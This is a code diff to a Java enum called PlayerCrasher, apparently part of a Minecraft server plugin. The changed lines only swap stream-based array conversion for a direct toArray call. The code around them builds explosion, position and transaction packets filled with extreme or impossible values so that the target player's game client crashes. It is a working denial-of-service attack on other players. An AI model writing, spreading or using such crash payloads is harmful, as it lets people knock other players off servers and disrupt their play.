@@ -48,7 +48,7 @@ public enum PlayerCrasher {
 				PacketPlayOutExplosion explosion = new PacketPlayOutExplosion(value, value, value, impossibleFloat, Collections.emptyList(), new Vec3D(value, value, value));
 				packets.add(explosion);
 			}
-			return packets.stream().toArray(PacketPlayOutExplosion[]::new);
+			return packets.toArray(new PacketPlayOutExplosion[0]);
 		}),
 		POSITION((Player player) -> {
 			double impossibleValue = Double.MAX_VALUE / 0x87D;
@@ -63,7 +63,7 @@ public enum PlayerCrasher {
 				PacketPlayOutPosition position = new PacketPlayOutPosition(value, value, value, impossibleFloat, impossibleFloat, Collections.emptySet());
 				packets.add(position);
 			}
-			return packets.stream().toArray(PacketPlayOutPosition[]::new);
+			return packets.toArray(new PacketPlayOutPosition[0]);
 		}),
 		C0F((Player player) -> {
 			List<PacketPlayOutTransaction> packets = new ArrayList<>();
@@ -73,7 +73,7 @@ public enum PlayerCrasher {
 				packets.add(new PacketPlayOutTransaction(0x7FFFFFFF, (short) 0x7FFF, fuck));
 				packets.add(new PacketPlayOutTransaction(0x80000000, (short) 0x8000, fuck));
 			}
-			return packets.stream().toArray(PacketPlayOutTransaction[]::new);
+			return packets.toArray(new PacketPlayOutTransaction[0]);
 		});
 
 		private Function<Player, Packet<?>[]> function;
